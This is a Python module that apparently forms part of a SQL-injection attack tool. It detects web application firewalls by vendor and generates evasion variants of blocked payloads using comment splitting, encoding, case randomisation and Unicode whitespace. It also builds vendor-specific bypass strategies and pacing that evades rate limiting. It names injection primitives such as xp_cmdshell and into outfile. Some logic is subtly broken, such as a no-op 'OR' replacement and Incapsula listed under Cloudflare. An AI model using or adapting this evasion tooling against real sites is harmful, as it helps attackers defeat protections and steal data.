# waf_patterns.py
import re
import json
import random
from urllib.parse import urlparse, parse_qs

class WAFPatternDetector:
    """Advanced WAF pattern detection and analysis"""
    
    def __init__(self):
        # Common WAF vendor signatures
        self.waf_signatures = {
            'cloudflare': [
                r'cloudflare',
                r'cf-ray',
                r'attention.required',
                r'incapsula',
                r'your.ip.has.been.blocked'
            ],
            'akamai': [
                r'akamai',
                r'access.denied',
                r'you.don.t.have.permission',
                r'ghost.ip'
            ],
            'imperva': [
                r'imperva',
                r'incapsula',
                r'request.cannot.be.served',
                r'unsupported.content.type'
            ],
            'mod_security': [
                r'mod_security',
                r'not.acceptable',
                r'modsecurity'
            ],
            'fortinet': [
                r'fortigate',
                r'fortiguard',
                r'application.firewall',
                r'fortinet'
            ],
            'f5': [
                r'big.ip',
                r'f5',
                r'the.requested.url.was.rejected'
            ],
            'barracuda': [
                r'barracuda',
                r'barra.cuda'
            ],
            'sucuri': [
                r'sucuri',
                r'access.denied.sucuri.website.firewall',
                r'sucuri.website.firewall'
            ],
            'aws_waf': [
                r'aws',
                r'request.blocked',
                r'aws.waf'
            ],
            'azure_waf': [
                r'azure',
                r'microsoft',
                r'request.blocked.by.application.gateway'
            ],
            'wordfence': [
                r'wordfence',
                r'generated.by.wordfence',
                r'a.possibly.security.issue'
            ],
            'comodo': [
                r'comodo',
                r'protected.by.comodo.waf',
                r'comodo.cwaf'
            ]
        }
        
        # WAF block patterns
        self.block_patterns = [
            r'blocked',
            r'forbidden',
            r'not.allowed',
            r'security.violation',
            r'malicious',
            r'suspicious',
            r'unauthorized',
            r'access.denied',
            r'rejected',
            r'invalid.request',
            r'firewall',
            r'waf',
            r'hack',
            r'attack',
            r'injection',
            r'sql',
            r'xss',
            r'403',
            r'406',
            r'418'
        ]
        
        # SQL injection detection patterns used by WAFs
        self.sql_patterns = [
            r'union\s+select',
            r'select.*from',
            r'insert\s+into',
            r'update.*set',
            r'delete\s+from',
            r'drop\s+table',
            r'create\s+table',
            r'exec(\s|\()+',
            r'xp_cmdshell',
            r'waitfor\s+delay',
            r'sleep\s*\(',
            r'benchmark\s*\(',
            r'and\s+1=1',
            r'or\s+1=1',
            r';\s*(--|#)',
            r'/\*.*\*/',
            r'@@version',
            r'information_schema',
            r'load_file\s*\(',
            r'into\s+outfile',
            r'into\s+dumpfile'
        ]
        
        # Advanced WAF rule patterns
        self.advanced_waf_rules = {
            'length_limits': [
                (r'select\s+\w+\s+from', 'SELECT statement length'),
                (r'union\s+select', 'UNION SELECT pattern'),
                (r';\s*(drop|create|alter)', 'Multiple statement detection')
            ],
            'character_restrictions': [
                (r'[\'";]', 'Special characters'),
                (r'/\*!\d+', 'MySQL version-specific comments'),
                (r'0x[0-9a-f]+', 'Hex encoding'),
                (r'char\([0-9,]+\)', 'CHAR function usage')
            ],
            'whitespace_detection': [
                (r'\s{2,}', 'Multiple whitespace'),
                (r'[\t\n\r]', 'Tab/newline characters'),
                (r'[\u2000-\u200f]', 'Unicode whitespace')
            ],
            'encoding_detection': [
                (r'%[0-9a-f]{2}', 'URL encoding'),
                (r'&#x?[0-9]+;', 'HTML entities'),
                (r'\\x[0-9a-f]{2}', 'Hex escapes')
            ]
        }
        
        # WAF behavioral patterns
        self.behavioral_patterns = {
            'rate_limiting': ['429', 'too.many.requests', 'rate.limit'],
            'challenge_response': ['captcha', 'challenge', 'verify.you.are.human'],
            'ip_blocking': ['ip.blocked', 'your.ip', 'permanent.block'],
            'session_termination': ['session.expired', 'login.again', 'invalid.session']
        }

    def detect_waf_from_response(self, response_headers, response_body, status_code):
        """Detect WAF presence from HTTP response"""
        waf_detection = { 
            'waf_detected': False,
            'waf_vendor': 'unknown',
            'confidence': 0,
            'evidence': [],
            'block_reason': None,
            'bypass_suggestions': []
        }
        
        combined_raw = f"{response_headers} {response_body}"
        combined_text = str(combined_raw).lower()
        
        # Check for block patterns
        block_evidence = []
        for pattern in self.block_patterns:
            if re.search(pattern, combined_text, re.IGNORECASE):
                block_evidence.append(pattern)
                waf_detection['waf_detected'] = True
                waf_detection['confidence'] += 20
        
        # Check for specific WAF vendors
        vendor_evidence = {}
        for vendor, signatures in self.waf_signatures.items():
            for signature in signatures:
                if re.search(signature, combined_text, re.IGNORECASE):
                    if vendor not in vendor_evidence:
                        vendor_evidence[vendor] = []
                    vendor_evidence[vendor].append(signature)
                    waf_detection['waf_detected'] = True
                    waf_detection['confidence'] += 30
                    
        
        # Determine primary WAF vendor
        if vendor_evidence:
            # Find vendor with most evidence
            primary_vendor = max(vendor_evidence.items(), key=lambda x: len(x[1]))
            waf_detection['waf_vendor'] = primary_vendor[0]
            waf_detection['evidence'].extend(primary_vendor[1])
        
        # Check status code patterns
        if status_code in [403, 406, 418, 429]:
            waf_detection['waf_detected'] = True
            waf_detection['confidence'] += 25
            waf_detection['block_reason'] = f'HTTP {status_code}'
        
        # Add block evidence
        waf_detection['evidence'].extend(block_evidence)
        
        # Generate bypass suggestions based on detection
        if waf_detection['waf_detected']:
            waf_detection['bypass_suggestions'] = self._generate_bypass_suggestions(
                waf_detection['waf_vendor'],
                block_evidence
            )
        
        return waf_detection

    def analyze_payload_blocked(self, payload, response_headers, response_body, status_code):
        """Analyze why a specific payload was blocked"""
        analysis = {
            'blocked': False,
            'triggered_patterns': [],
            'suspicious_elements': [],
            'waf_rules_matched': [],
            'bypass_recommendations': []
        }
        
        # Check if response indicates blocking
        if self._is_blocked_response(response_headers, response_body, status_code):
            analysis['blocked'] = True
            
            # Analyze payload against SQL patterns
            for pattern in self.sql_patterns:
                if re.search(pattern, payload, re.IGNORECASE):
                    analysis['triggered_patterns'].append(pattern)
            
            # Check advanced WAF rules
            for rule_type, rules in self.advanced_waf_rules.items():
                for pattern, description in rules:
                    if re.search(pattern, payload, re.IGNORECASE):
                        analysis['waf_rules_matched'].append({
                            'rule_type': rule_type,
                            'pattern': pattern,
                            'description': description
                        })
            
            # Identify suspicious elements
            analysis['suspicious_elements'] = self._identify_suspicious_elements(payload)
            
            # Generate specific bypass recommendations
            analysis['bypass_recommendations'] = self._generate_specific_bypass_recommendations(
                payload,
                analysis['triggered_patterns'],
                analysis['waf_rules_matched']
            )
        
        return analysis

    def _is_blocked_response(self, response_headers, response_body, status_code):
        """Determine if response indicates WAF blocking"""
        combined = f"{response_headers} {response_body}".lower()
        
        # Check status code
        if status_code in [403, 406, 418, 429]:
            return True
        
        # Check block patterns
        for pattern in self.block_patterns:
            if re.search(pattern, combined, re.IGNORECASE):
                return True
        
        # Check WAF signatures
        for vendor_signatures in self.waf_signatures.values():
            for signature in vendor_signatures:
                if re.search(signature, combined, re.IGNORECASE):
                    return True
        
        return False

    def _identify_suspicious_elements(self, payload):
        """Identify specific elements in payload that might trigger WAF"""
        suspicious = set()

        
        # Check for SQL keywords
        sql_keywords = ['union', 'select', 'insert', 'update', 'delete', 'drop', 'exec', 'xp_']
        for keyword in sql_keywords:
            if re.search(rf'\b{re.escape(keyword)}\b', payload, re.IGNORECASE):
                suspicious.add(f"SQL keyword: {keyword}")
        
        # Check for special characters
        special_chars = ["'", '"', ';', '--', '/*', '*/', '#', '`']
        for char in special_chars:
            if char in payload:
                suspicious.add(f"Special character: {char}")
        
        # Check for functions
        functions = ['sleep', 'benchmark', 'waitfor', 'load_file', 'into_outfile']
        for func in functions:
            if func in payload.lower():
                suspicious.add(f"Function: {func}")
        
        # Check for encoding patterns
        if '%' in payload:
            suspicious.add("URL encoding detected")
        if '0x' in payload.lower():
            suspicious.add("Hex encoding detected")
        if 'char(' in payload.lower():
            suspicious.add("CHAR function detected")
        
        return list(suspicious)

    def _generate_bypass_suggestions(self, waf_vendor, block_evidence):
        """Generate WAF-specific bypass suggestions"""
        suggestions = []
        
        vendor_suggestions = {
            'cloudflare': [
                "Use case manipulation techniques",
                "Try whitespace obfuscation with Unicode characters",
                "Apply multiple encoding layers",
                "Use comment obfuscation with MySQL version-specific comments",
                "Experiment with parameter pollution"
            ],
            'akamai': [
                "Use advanced comment techniques",
                "Try protocol-level bypasses",
                "Apply chunked encoding",
                "Use template injection patterns",
                "Experiment with null byte injection"
            ],
            'imperva': [
                "Use string concatenation techniques",
                "Try hex encoding for keywords",
                "Apply SQL CHAR function obfuscation",
                "Use keyword splitting with comments",
                "Experiment with unicode obfuscation"
            ],
            'mod_security': [
                "Use case randomization",
                "Try multiple whitespace variations",
                "Apply selective URL encoding",
                "Use comment-based obfuscation",
                "Experiment with parameter fragmentation"
            ],
            'aws_waf': [
                "Use advanced encoding combinations",
                "Try case manipulation with special characters",
                "Apply comment obfuscation with random content",
                "Use mixed whitespace characters",
                "Experiment with HTTP method overriding"
            ]
        }
        
        # Add vendor-specific suggestions
        if waf_vendor in vendor_suggestions:
            suggestions.extend(vendor_suggestions[waf_vendor])
        else:
            # General suggestions for unknown WAFs
            suggestions.extend([
                "Apply case manipulation (random/alternate case)",
                "Use whitespace obfuscation with various characters",
                "Try URL encoding of special characters",
                "Use comment injection between keywords",
                "Experiment with string concatenation techniques",
                "Apply hex encoding for specific keywords",
                "Use SQL CHAR function for complete obfuscation",
                "Try multiple encoding layers (URL + HTML)",
                "Use parameter pollution techniques",
                "Experiment with protocol-level bypasses"
            ])
        
        # Add evidence-based suggestions
        if any('sql' in evidence for evidence in block_evidence):
            suggestions.extend([
                "Obfuscate SQL keywords using concatenation",
                "Use alternative SQL syntax",
                "Try database-specific functions",
                "Use time-based blind techniques instead of error-based"
            ])
        
        if any('encoding' in evidence for evidence in block_evidence):
            suggestions.extend([
                "Use mixed encoding types",
                "Try double URL encoding",
                "Use Unicode normalization attacks",
                "Experiment with case variations in encoded characters"
            ])
        
        return suggestions[:8]  # Limit to top 8 suggestions

    def _generate_specific_bypass_recommendations(self, payload, triggered_patterns, waf_rules_matched):
        """Generate specific bypass recommendations for a blocked payload"""
        recommendations = []
        
        # Analyze triggered patterns and suggest alternatives
        for pattern in triggered_patterns:
            if 'union' in pattern:
                recommendations.extend([
                    "Use UNION ALL SELECT instead of UNION SELECT",
                    "Split UNION with comments: UNI/**/ON",
                    "Use case variation: UnIoN SeLeCt",
                    "Try hex encoding: 0x756e696f6e for 'union'"
                ])
            
            if 'select' in pattern:
                recommendations.extend([
                    "Use string concatenation: SEL'||'ECT",
                    "Split with comments: SEL/*xyz*/ECT",
                    "Use CHAR function: CHAR(83,69,76,69,67,84)",
                    "Try alternative syntax: (SELECT)"
                ])
            
            if 'sleep' in pattern or 'benchmark' in pattern:
                recommendations.extend([
                    "Use alternative time-delay functions",
                    "Try heavy queries instead of sleep",
                    "Use conditional time delays",
                    "Experiment with different delay values"
                ])
        
        # Analyze WAF rule matches
        for rule_match in waf_rules_matched:
            rule_type = rule_match['rule_type']
            
            if rule_type == 'length_limits':
                recommendations.extend([
                    "Break payload into smaller chunks",
                    "Use parameter pollution to split payload",
                    "Try chunked transfer encoding",
                    "Use multiple requests with partial payloads"
                ])
            
            if rule_type == 'character_restrictions':
                recommendations.extend([
                    "Use alternative special characters",
                    "Try Unicode homoglyphs",
                    "Use URL encoding selectively",
                    "Experiment with different comment styles"
                ])
            
            if rule_type == 'whitespace_detection':
                recommendations.extend([
                    "Use tab characters instead of spaces",
                    "Try multiple newline characters",
                    "Use Unicode whitespace characters",
                    "Remove all whitespace where possible"
                ])
        
        return list(set(recommendations))[:6]  # Remove duplicates and limit

    def generate_waf_test_payloads(self, base_payload, waf_vendor=None):
        """Generate WAF test payloads optimized for specific WAF vendors"""
        test_payloads = []
        
        vendor_specific_payloads = {
            'cloudflare': [
                # Case variation
                base_payload.upper(),
                base_payload.lower(),
                # Comment obfuscation
                base_payload.replace('SELECT', 'SEL/*!50000*/ECT'),
                base_payload.replace('UNION', 'UNI/*xyz*/ON'),
                # Whitespace variation
                base_payload.replace(' ', '\t'),
                base_payload.replace(' ', '\u2000'),
            ],
            'akamai': [
                # Encoding variations
                base_payload.replace("'", "%27"),
                base_payload.replace("'", "%u0027"),
                base_payload.replace("'", "&#39;"),
                # Comment techniques
                base_payload.replace(' ', '/**/'),
                base_payload.replace('SELECT', 'SEL/**/ECT'),
            ],
            'imperva': [
                # String concatenation
                base_payload.replace('SELECT', 'CONCAT(\'SEL\',\'ECT\')'),
                base_payload.replace('OR', 'O' + 'R'),
                # Hex encoding
                base_payload.replace('admin', '0x61646d696e'),
                base_payload.replace('SELECT', '0x53454c454354'),
            ],
            'mod_security': [
                # Case randomization
                ''.join(random.choice([c.upper(), c.lower()]) for c in base_payload),
                # Multiple encoding
                base_payload.replace("'", "%2527"),
                base_payload.replace(' ', '%0a'),
            ]
        }
        
        if waf_vendor and waf_vendor in vendor_specific_payloads:
            test_payloads.extend(vendor_specific_payloads[waf_vendor])
        else:
            # General WAF test payloads
            test_payloads.extend([
                base_payload.upper(),
                base_payload.lower(),
                base_payload.replace(' ', '/**/'),
                base_payload.replace("'", "%27"),
                base_payload.replace('SELECT', 'SEL/*!*/ECT'),
                base_payload.replace('UNION', 'UNI/**/ON'),
                base_payload.replace(' ', '\t'),
                base_payload.replace('OR', 'O' + 'R'),
            ])
        
        return test_payloads

    def create_waf_evasion_strategy(self, waf_analysis, previous_attempts=None):
        """Create an optimized WAF evasion strategy based on analysis"""
        strategy = {
            'primary_techniques': [],
            'fallback_techniques': [],
            'testing_sequence': [],
            'risk_level': 'medium',
            'estimated_success': 50
        }
        
        waf_vendor = waf_analysis.get('waf_vendor', 'unknown')
        confidence = waf_analysis.get('confidence', 0)
        
        # Vendor-specific strategies
        vendor_strategies = {
            'cloudflare': {
                'primary': ['case_manipulation', 'comment_obfuscation', 'whitespace_obfuscation'],
                'fallback': ['encoding_techniques', 'parameter_pollution', 'protocol_level'],
                'risk': 'low'
            },
            'akamai': {
                'primary': ['encoding_techniques', 'multiple_encoding', 'comment_advanced'],
                'fallback': ['chunked_encoding', 'template_injection', 'protocol_level'],
                'risk': 'medium'
            },
            'imperva': {
                'primary': ['string_concatenation', 'hex_encoding', 'sql_char_function'],
                'fallback': ['unicode_obfuscation', 'keyword_splitting', 'null_bytes'],
                'risk': 'high'
            },
            'mod_security': {
                'primary': ['case_manipulation', 'whitespace_obfuscation', 'comment_obfuscation'],
                'fallback': ['encoding_techniques', 'parameter_pollution', 'multiple_encoding'],
                'risk': 'medium'
            }
        }
        
        if waf_vendor in vendor_strategies:
            strategy.update(vendor_strategies[waf_vendor])
        else:
            # Default strategy for unknown WAFs
            strategy['primary_techniques'] = ['case_manipulation', 'encoding_techniques', 'comment_obfuscation']
            strategy['fallback_techniques'] = ['whitespace_obfuscation', 'string_concatenation', 'hex_encoding']
            strategy['risk_level'] = 'medium'
        
        # Adjust based on confidence
        if confidence > 80:
            strategy['estimated_success'] = 70
        elif confidence > 50:
            strategy['estimated_success'] = 50
        else:
            strategy['estimated_success'] = 30
        
        # Create testing sequence
        strategy['testing_sequence'] = self._create_testing_sequence(
            strategy['primary_techniques'],
            strategy['fallback_techniques']
        )
        
        return strategy

    def _create_testing_sequence(self, primary_tech, fallback_tech):
        """Create an optimized testing sequence for WAF evasion"""
        sequence = []
        
        # Start with simple techniques
        simple_tech = ['case_manipulation', 'whitespace_obfuscation']
        for tech in simple_tech:
            if tech in primary_tech:
                sequence.append(tech)
        
        # Add encoding techniques
        encoding_tech = ['encoding_techniques', 'hex_encoding', 'multiple_encoding']
        for tech in encoding_tech:
            if tech in primary_tech:
                sequence.append(tech)
        
        # Add advanced techniques
        advanced_tech = ['comment_obfuscation', 'string_concatenation', 'sql_char_function']
        for tech in advanced_tech:
            if tech in primary_tech:
                sequence.append(tech)
        
        # Add fallback techniques
        sequence.extend(fallback_tech)
        
        return sequence

    def generate_waf_report(self, detection_results, analysis_results, test_results):
        """Generate comprehensive WAF analysis report"""
        report = {
            'summary': {
                'waf_detected': detection_results['waf_detected'],
                'waf_vendor': detection_results['waf_vendor'],
                'confidence_level': detection_results['confidence'],
                'block_effectiveness': self._calculate_block_effectiveness(test_results)
            },
            'detection_details': detection_results,
            'analysis_findings': analysis_results,
            'evasion_strategy': self.create_waf_evasion_strategy(detection_results),
            'recommendations': {
                'immediate_actions': detection_results['bypass_suggestions'][:3],
                'advanced_techniques': detection_results['bypass_suggestions'][3:6],
                'testing_approach': self._get_testing_approach(detection_results['waf_vendor'])
            }
        }
        
        return report

    def _calculate_block_effectiveness(self, test_results):
        """Calculate WAF block effectiveness from test results"""
        if not test_results:
            return 0
        
        blocked = test_results.get('blocked', [])
        total = len(blocked) + len(test_results.get('bypassed', []))
        
        if total == 0:
            return 0
        
        return int((len(blocked) / total) * 100)

    def _get_testing_approach(self, waf_vendor):
        """Get recommended testing approach for specific WAF"""
        approaches = {
            'cloudflare': "Start with case/whitespace variations, then move to encoding and comments",
            'akamai': "Focus on encoding techniques and protocol-level bypasses",
            'imperva': "Use string obfuscation and hex encoding, avoid simple patterns",
            'mod_security': "Try comment injection and parameter fragmentation techniques",
            'unknown': "Systematic approach: case → whitespace → encoding → comments → advanced"
        }
        
        return approaches.get(waf_vendor, approaches['unknown'])


class WAFBehaviorAnalyzer:
    """Analyze WAF behavioral patterns and adapt strategies"""
    
    def __init__(self):
        self.request_history = []
        self.block_patterns = []
        self.successful_payloads = []
        self.learning_rate = 0.1
        
    def record_attempt(self, payload, was_blocked, response_time, waf_signature=None):
        """Record WAF interaction attempt"""
        attempt = {
            'payload': payload,
            'blocked': was_blocked,
            'response_time': response_time,
            'timestamp': len(self.request_history),
            'waf_signature': waf_signature
        }
        
        self.request_history.append(attempt)
        
        if was_blocked:
            self.block_patterns.append(payload)
        else:
            self.successful_payloads.append(payload)
    
    def analyze_behavioral_patterns(self):
        """Analyze WAF behavioral patterns from history"""
        if len(self.request_history) < 5:
            return None
        
        analysis = {
            'rate_limiting_detected': self._detect_rate_limiting(),
            'pattern_learning': self._detect_pattern_learning(),
            'session_analysis': self._analyze_session_behavior(),
            'adaptive_blocks': self._detect_adaptive_blocking(),
            'recommended_delay': self._calculate_optimal_delay()
        }
        
        return analysis
    
    def _detect_rate_limiting(self):
        """Detect if WAF implements rate limiting"""
        recent_blocks = [req for req in self.request_history[-10:] if req['blocked']]
        
        if len(recent_blocks) >= 8:
            return True
        
        # Check for increasing response times (possible throttling)
        response_times = [req['response_time'] for req in self.request_history[-5:]]
        if len(response_times) >= 3:
            increasing = all(response_times[i] < response_times[i+1] for i in range(len(response_times)-1))
            if increasing:
                return True
        
        return False
    
    def _detect_pattern_learning(self):
        """Detect if WAF learns from previous attempts"""
        if len(self.block_patterns) < 3:
            return False
        
        # Check if similar payloads are being blocked over time
        recent_blocks = self.block_patterns[-5:]
        if len(recent_blocks) >= 3:
            # Simple pattern: if we see increasing sophistication in blocks
            return True
        
        return False
    
    def _analyze_session_behavior(self):
        """Analyze session-based blocking behavior"""
        # Check for session termination patterns
        session_blocks = [req for req in self.request_history if req.get('waf_signature') == 'session_block']
        return len(session_blocks) > 0
    
    def _detect_adaptive_blocking(self):
        """Detect if WAF uses adaptive blocking based on behavior"""
        # Analyze if blocking becomes more aggressive over time
        block_sequence = [1 if req['blocked'] else 0 for req in self.request_history]
        
        if len(block_sequence) < 10:
            return False
        
        # Check for increasing block frequency
        recent_blocks = sum(block_sequence[-5:])
        earlier_blocks = sum(block_sequence[-10:-5])
        
        return recent_blocks > earlier_blocks
    
    def _calculate_optimal_delay(self):
        """Calculate optimal delay between requests"""
        response_times = [req['response_time'] for req in self.request_history[-10:] if req['response_time']]
        
        if not response_times:
            return 1.0
        
        avg_response_time = sum(response_times) / len(response_times)
        
        # Add buffer for rate limiting
        if self._detect_rate_limiting():
            return avg_response_time * 3
        else:
            return avg_response_time * 1.5
    
    def get_optimized_strategy(self):
        """Get optimized strategy based on behavioral analysis"""
        behavior = self.analyze_behavioral_patterns()
        
        if not behavior:
            return {
                'request_delay': 1.0,
                'batch_size': 5,
                'technique_rotation': True,
                'aggressiveness': 'medium'
            }
        
        strategy = {
            'request_delay': behavior['recommended_delay'],
            'batch_size': 3 if behavior['rate_limiting_detected'] else 5,
            'technique_rotation': behavior['pattern_learning'],
            'aggressiveness': 'low' if behavior['adaptive_blocks'] else 'medium'
        }
        
        return strategy


# Utility function to integrate with your existing system
def create_waf_aware_payload_generator(bypass_engine, waf_detector):
    """Create a WAF-aware payload generator that integrates with your existing system"""
    
    class WAFAwareGenerator:
        def __init__(self, bypass_engine, waf_detector):
            self.bypass_engine = bypass_engine
            self.waf_detector = waf_detector
            self.behavior_analyzer = WAFBehaviorAnalyzer()
        
        def generate_optimized_payloads(self, base_payloads, waf_analysis):
            """Generate payloads optimized for detected WAF"""
            optimized_payloads = []
            
            for payload in base_payloads:
                # Apply WAF-specific optimizations
                waf_optimized = self._optimize_for_waf(payload, waf_analysis)
                optimized_payloads.extend(waf_optimized)
            
            return list(set(optimized_payloads))
        
        def _optimize_for_waf(self, payload, waf_analysis):
            """Optimize single payload for specific WAF"""
            vendor = waf_analysis.get('waf_vendor', 'unknown')
            confidence = waf_analysis.get('confidence', 0)
            
            # Generate vendor-specific variations
            test_payloads = self.waf_detector.generate_waf_test_payloads(payload, vendor)
            
            # Apply additional bypass techniques based on confidence
            if confidence > 70:
                # High confidence - use aggressive techniques
                advanced_payloads = self.bypass_engine.apply_all_bypasses(payload, max_variations=10)
                test_payloads.extend(advanced_payloads)
            
            return test_payloads
        
        def record_and_adapt(self, payload, response, was_blocked):
            """Record attempt and adapt strategy"""
            self.behavior_analyzer.record_attempt(
                payload=payload,
                was_blocked=was_blocked,
                response_time=response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0,
                waf_signature=None
            )
        
        def get_adaptive_strategy(self):
            """Get adaptive strategy based on WAF behavior"""
            return self.behavior_analyzer.get_optimized_strategy()
    
    return WAFAwareGenerator(bypass_engine, waf_detector)